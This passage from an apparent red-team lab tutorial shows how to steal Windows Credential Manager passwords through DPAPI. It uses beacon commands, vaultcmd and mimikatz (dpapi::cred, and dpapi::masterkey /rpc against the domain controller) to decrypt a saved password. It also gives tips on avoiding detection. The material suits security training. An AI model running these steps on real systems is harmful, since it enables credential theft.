The credential manager blobs are stored in the user's `AppData` directory.

```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 372b     fil     02/25/2021 13:07:38   9D54C839752B38B233E5D56FDD7891A7
 10kb     fil     02/21/2021 11:49:40   DFBE70A7E5CC19A398EBF1B96859CE5D
```
  

The native `vaultcmd` tool can also be used to list them.

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/srv-1
Identity: DEV\bfarmer
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

  

Or `mimikatz vault::list`.

```
beacon> mimikatz vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
    Name       : Web Credentials
    Path       : C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
    Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
    Name       : Windows Credentials
    Path       : C:\Users\bfarmer\AppData\Local\Microsoft\Vault
    Items (1)
      0.    (null)
        Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
        LastWritten     : 2/25/2021 1:07:38 PM
        Flags           : 00000000
        Ressource       : [STRING] Domain:target=TERMSRV/srv-1
        Identity        : [STRING] DEV\bfarmer
        Authenticator   : 
        PackageSid      : 
        *Authenticator* : [BYTE*] 

        *** Domain Password ***
```

  

If you go to the **Control Panel > Credential Manager** on WKSTN-1 and select **Windows Credentials**, you will see how this credential appears to the user. And opening the **Remote Desktop Connection** client shows how these creds are automatically populated for the target server.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/dpapi/cred-manager.png)

  

To decrypt the credential, we need to find the master encryption key.

First, run `dpapi::cred` and provide the location to the blob on disk.

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7

**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619[...snip...]b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985
```

  

The **pbData** field contains the encrypted data and the **guidMasterKey** contains the GUID of the key needed to decrypt it. The Master Key information is stored within the user's `AppData\Roaming\Microsoft\Protect` directory (where `S-1-5-21-*` is their SID).

```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 928b     fil     02/21/2021 11:49:40   BK-DEV
 24b      fil     02/21/2021 11:49:40   Preferred
```

  
Notice how this filename **a23a1631-e2ca-4805-9f2f-fe8966fd8698** matches the **guidMasterKey** field above.

There are a few ways to get the actual Master Key content. If you have access to a high integrity session, you may be able to dump it from memory using `sekurlsa::dpapi`. However it may not always be cached here and this interacts with LSASS which is not ideal for OPSEC. My preferred method is to use the RPC service exposed on the Domain Controller, which is a "legitimate" means (as in, by design and using legitimate RPC traffic).

Run `mimikatz dpapi::masterkey`, provide the path to the Master Key information and specify `/rpc`.

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
  sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```

  

The **key** field is the key needed to decrypt the credential, which we can do with `dpapi::cred`.

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df

Decrypting Credential:
 [...snip...]
  UserName       : DEV\bfarmer
  CredentialBlob : Sup3rman
```


In this case bfarmer is a local admin on SRV-1, so they just have their own domain credentials saved. It's worth noting that even if they had local credentials or even a different set of domain credentials saved, the process to decrypt them would be exactly the same.